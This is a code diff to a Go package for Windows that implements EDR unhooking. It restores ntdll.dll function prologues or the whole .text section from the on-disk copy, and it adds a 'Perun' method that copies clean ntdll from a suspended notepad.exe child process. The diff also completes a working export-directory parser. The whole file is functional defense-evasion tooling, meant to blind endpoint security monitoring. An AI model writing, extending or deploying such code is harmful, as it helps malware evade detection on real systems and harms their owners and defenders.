@@ -7,14 +7,15 @@
 // Detection: High — reading ntdll from disk or spawning processes is monitored.
 //
 // Three methods by increasing sophistication:
-//   - ClassicUnhook: restore first 5 bytes of a function from a fresh disk copy
+//   - ClassicUnhook: restore first bytes of a function from a disk copy of ntdll
 //   - FullUnhook: replace the entire .text section from a disk copy
-//   - PerunUnhook: read pristine ntdll from a freshly spawned child process
+//   - PerunUnhook: read pristine ntdll from a freshly spawned child process (notepad)
 package unhook
 
 import (
 	"bytes"
 	"debug/pe"
+	"encoding/binary"
 	"fmt"
 	"os"
 	"path/filepath"
@@ -23,27 +24,31 @@ import (
 	"golang.org/x/sys/windows"
 )
 
-// ClassicUnhook restores the first bytes of a hooked function in ntdll.dll
-// by reading the original bytes from the clean ntdll copy on disk.
+// ClassicUnhook restores the first 5 bytes of a hooked ntdll function
+// by reading the original prologue from the clean ntdll.dll on disk.
 //
-// funcName: the name of the function to unhook (e.g., "NtAllocateVirtualMemory").
+// This works because the on-disk ntdll is never hooked — EDR hooks are
+// applied in-memory after the DLL is loaded.
 func ClassicUnhook(funcName string) error {
-	// Load a fresh copy of ntdll from disk
 	sysDir, _ := windows.GetSystemDirectory()
 	ntdllPath := filepath.Join(sysDir, "ntdll.dll")
 
-	freshDLL, err := pe.Open(ntdllPath)
+	// Read the clean ntdll from disk and parse as PE
+	rawBytes, err := os.ReadFile(ntdllPath)
 	if err != nil {
-		return fmt.Errorf("open ntdll.dll: %w", err)
+		return fmt.Errorf("read ntdll.dll: %w", err)
 	}
-	defer freshDLL.Close()
 
-	// Find the export in the fresh copy
-	freshBytes, rva, err := findExportBytes(freshDLL, funcName, 5)
+	freshDLL, err := pe.NewFile(bytes.NewReader(rawBytes))
 	if err != nil {
-		return fmt.Errorf("find export %s: %w", funcName, err)
+		return fmt.Errorf("parse ntdll.dll: %w", err)
 	}
-	_ = rva
+
+	// Find the export RVA and read first 5 bytes from .text section
+	freshBytes, err := readExportBytes(freshDLL, rawBytes, funcName, 5)
+	if err != nil {
+		return fmt.Errorf("read export %s: %w", funcName, err)
+	}
 
 	// Get the address of the function in the loaded (hooked) ntdll
 	proc := windows.NewLazySystemDLL("ntdll.dll").NewProc(funcName)
@@ -52,7 +57,7 @@ func ClassicUnhook(funcName string) error {
 	}
 	addr := proc.Addr()
 
-	// Overwrite the hooked bytes with the original ones
+	// Overwrite the hooked bytes with the clean ones
 	var oldProtect uint32
 	if err := windows.VirtualProtect(addr, uintptr(len(freshBytes)), windows.PAGE_EXECUTE_READWRITE, &oldProtect); err != nil {
 		return fmt.Errorf("VirtualProtect: %w", err)
@@ -71,7 +76,6 @@ func FullUnhook() error {
 	sysDir, _ := windows.GetSystemDirectory()
 	ntdllPath := filepath.Join(sysDir, "ntdll.dll")
 
-	// Read clean ntdll from disk
 	rawBytes, err := os.ReadFile(ntdllPath)
 	if err != nil {
 		return fmt.Errorf("read ntdll.dll: %w", err)
@@ -82,7 +86,6 @@ func FullUnhook() error {
 		return fmt.Errorf("parse ntdll.dll: %w", err)
 	}
 
-	// Find .text section in disk copy
 	var textSection *pe.Section
 	for _, sec := range freshDLL.Sections {
 		if sec.Name == ".text" {
@@ -99,7 +102,6 @@ func FullUnhook() error {
 		return fmt.Errorf("read .text data: %w", err)
 	}
 
-	// Get the base address of ntdll in memory
 	ntdllHandle, err := windows.LoadLibrary("ntdll.dll")
 	if err != nil {
 		return fmt.Errorf("LoadLibrary ntdll: %w", err)
@@ -108,7 +110,6 @@ func FullUnhook() error {
 	textAddr := baseAddr + uintptr(textSection.VirtualAddress)
 	textSize := uintptr(len(freshText))
 
-	// Replace the .text section
 	var oldProtect uint32
 	if err := windows.VirtualProtect(textAddr, textSize, windows.PAGE_EXECUTE_READWRITE, &oldProtect); err != nil {
 		return fmt.Errorf("VirtualProtect .text: %w", err)
@@ -124,11 +125,183 @@ func FullUnhook() error {
 	return nil
 }
 
-// findExportBytes locates a named export in a PE file and returns the first n bytes
-// of the function body along with the RVA.
-func findExportBytes(f *pe.File, name string, n int) ([]byte, uint32, error) {
-	// For a minimal implementation, we read from .text at the export RVA offset.
-	// The full implementation would parse the export directory table.
-	// For now, return an error — ClassicUnhook callers should use FullUnhook instead.
-	return nil, 0, fmt.Errorf("export lookup not implemented for %s — use FullUnhook instead", name)
+// PerunUnhook reads a pristine copy of ntdll.dll from a freshly spawned
+// suspended process (notepad.exe). The child process has a clean ntdll
+// because EDR hooks are typically applied after process initialization.
+//
+// Steps:
+//  1. Spawn notepad.exe in suspended state
+//  2. Read the ntdll.dll .text section from the child process memory
+//  3. Overwrite our hooked .text section with the clean copy
+//  4. Terminate the child process
+func PerunUnhook() error {
+	// Spawn notepad.exe suspended
+	sysDir, _ := windows.GetSystemDirectory()
+	notepadPath, _ := windows.UTF16PtrFromString(filepath.Join(sysDir, "notepad.exe"))
+
+	var si windows.StartupInfo
+	si.Cb = uint32(unsafe.Sizeof(si))
+	var pi windows.ProcessInformation
+
+	err := windows.CreateProcess(
+		notepadPath, nil, nil, nil, false,
+		windows.CREATE_SUSPENDED|windows.CREATE_NO_WINDOW,
+		nil, nil, &si, &pi,
+	)
+	if err != nil {
+		return fmt.Errorf("CreateProcess notepad: %w", err)
+	}
+	defer windows.CloseHandle(pi.Process)
+	defer windows.CloseHandle(pi.Thread)
+	defer windows.TerminateProcess(pi.Process, 0)
+
+	// Get ntdll base address in our process
+	ntdllHandle, err := windows.LoadLibrary("ntdll.dll")
+	if err != nil {
+		return fmt.Errorf("LoadLibrary ntdll: %w", err)
+	}
+	localBase := uintptr(ntdllHandle)
+
+	// Parse local ntdll headers to find .text section location and size
+	dosHeader := (*[2]byte)(unsafe.Pointer(localBase))
+	if dosHeader[0] != 'M' || dosHeader[1] != 'Z' {
+		return fmt.Errorf("invalid MZ header at ntdll base")
+	}
+	lfanew := *(*int32)(unsafe.Pointer(localBase + 0x3C))
+	peHeader := localBase + uintptr(lfanew)
+
+	// PE signature (4 bytes) + COFF header (20 bytes) = optional header at +24
+	optHeaderOffset := peHeader + 4 + 20
+	// SizeOfOptionalHeader is at COFF header offset +16
+	sizeOfOptHdr := *(*uint16)(unsafe.Pointer(peHeader + 4 + 16))
+	numSections := *(*uint16)(unsafe.Pointer(peHeader + 4 + 2))
+
+	// Section headers follow the optional header
+	sectionBase := optHeaderOffset + uintptr(sizeOfOptHdr)
+
+	var textVA uint32
+	var textSize uint32
+	for i := uint16(0); i < numSections; i++ {
+		secAddr := sectionBase + uintptr(i)*40
+		name := (*[8]byte)(unsafe.Pointer(secAddr))
+		if string(name[:5]) == ".text" {
+			textSize = *(*uint32)(unsafe.Pointer(secAddr + 8))  // VirtualSize
+			textVA = *(*uint32)(unsafe.Pointer(secAddr + 12))   // VirtualAddress
+			break
+		}
+	}
+	if textVA == 0 {
+		return fmt.Errorf(".text section not found in ntdll headers")
+	}
+
+	// Read pristine .text from the suspended child process
+	// ntdll is loaded at the same base in all processes (ASLR is per-boot, not per-process)
+	remoteTextAddr := localBase + uintptr(textVA)
+	cleanText := make([]byte, textSize)
+	var bytesRead uintptr
+	if err := windows.ReadProcessMemory(pi.Process, remoteTextAddr, &cleanText[0], uintptr(textSize), &bytesRead); err != nil {
+		return fmt.Errorf("ReadProcessMemory child ntdll: %w", err)
+	}
+
+	// Overwrite our hooked .text with the clean copy
+	localTextAddr := localBase + uintptr(textVA)
+	var oldProtect uint32
+	if err := windows.VirtualProtect(localTextAddr, uintptr(textSize), windows.PAGE_EXECUTE_READWRITE, &oldProtect); err != nil {
+		return fmt.Errorf("VirtualProtect .text: %w", err)
+	}
+
+	var written uintptr
+	currentProcess, _ := windows.GetCurrentProcess()
+	if err := windows.WriteProcessMemory(currentProcess, localTextAddr, &cleanText[0], uintptr(textSize), &written); err != nil {
+		return fmt.Errorf("WriteProcessMemory .text: %w", err)
+	}
+
+	windows.VirtualProtect(localTextAddr, uintptr(textSize), oldProtect, &oldProtect)
+	return nil
+}
+
+// readExportBytes finds a named export in a PE file and returns the first n bytes
+// of the function body by parsing the export directory table.
+func readExportBytes(f *pe.File, raw []byte, name string, n int) ([]byte, error) {
+	// Get optional header to find export directory RVA
+	var exportDirRVA, exportDirSize uint32
+	switch oh := f.OptionalHeader.(type) {
+	case *pe.OptionalHeader64:
+		if len(oh.DataDirectory) > 0 {
+			exportDirRVA = oh.DataDirectory[0].VirtualAddress
+			exportDirSize = oh.DataDirectory[0].Size
+		}
+	case *pe.OptionalHeader32:
+		if len(oh.DataDirectory) > 0 {
+			exportDirRVA = oh.DataDirectory[0].VirtualAddress
+			exportDirSize = oh.DataDirectory[0].Size
+		}
+	}
+	if exportDirRVA == 0 {
+		return nil, fmt.Errorf("no export directory")
+	}
+	_ = exportDirSize
+
+	// Convert RVA to file offset
+	exportOffset := rvaToOffset(f, exportDirRVA)
+	if exportOffset == 0 {
+		return nil, fmt.Errorf("cannot resolve export directory offset")
+	}
+
+	// Parse IMAGE_EXPORT_DIRECTORY
+	// NumberOfNames at offset +24, AddressOfFunctions at +28,
+	// AddressOfNames at +32, AddressOfNameOrdinals at +36
+	numNames := binary.LittleEndian.Uint32(raw[exportOffset+24:])
+	addrFunctions := binary.LittleEndian.Uint32(raw[exportOffset+28:])
+	addrNames := binary.LittleEndian.Uint32(raw[exportOffset+32:])
+	addrOrdinals := binary.LittleEndian.Uint32(raw[exportOffset+36:])
+
+	namesOff := rvaToOffset(f, addrNames)
+	ordinalsOff := rvaToOffset(f, addrOrdinals)
+	functionsOff := rvaToOffset(f, addrFunctions)
+
+	for i := uint32(0); i < numNames; i++ {
+		// Read name RVA
+		nameRVA := binary.LittleEndian.Uint32(raw[namesOff+i*4:])
+		nameOff := rvaToOffset(f, nameRVA)
+		if nameOff == 0 {
+			continue
+		}
+
+		// Read null-terminated name
+		end := nameOff
+		for end < uint32(len(raw)) && raw[end] != 0 {
+			end++
+		}
+		exportName := string(raw[nameOff:end])
+
+		if exportName == name {
+			// Get ordinal index
+			ordinal := binary.LittleEndian.Uint16(raw[ordinalsOff+i*2:])
+			// Get function RVA
+			funcRVA := binary.LittleEndian.Uint32(raw[functionsOff+uint32(ordinal)*4:])
+			funcOff := rvaToOffset(f, funcRVA)
+			if funcOff == 0 {
+				return nil, fmt.Errorf("cannot resolve function offset for %s", name)
+			}
+			if funcOff+uint32(n) > uint32(len(raw)) {
+				return nil, fmt.Errorf("function %s at offset %d exceeds file size", name, funcOff)
+			}
+			result := make([]byte, n)
+			copy(result, raw[funcOff:funcOff+uint32(n)])
+			return result, nil
+		}
+	}
+
+	return nil, fmt.Errorf("export %s not found in PE", name)
+}
+
+// rvaToOffset converts an RVA to a file offset using section headers.
+func rvaToOffset(f *pe.File, rva uint32) uint32 {
+	for _, sec := range f.Sections {
+		if rva >= sec.VirtualAddress && rva < sec.VirtualAddress+sec.VirtualSize {
+			return sec.Offset + (rva - sec.VirtualAddress)
+		}
+	}
+	return 0
 }
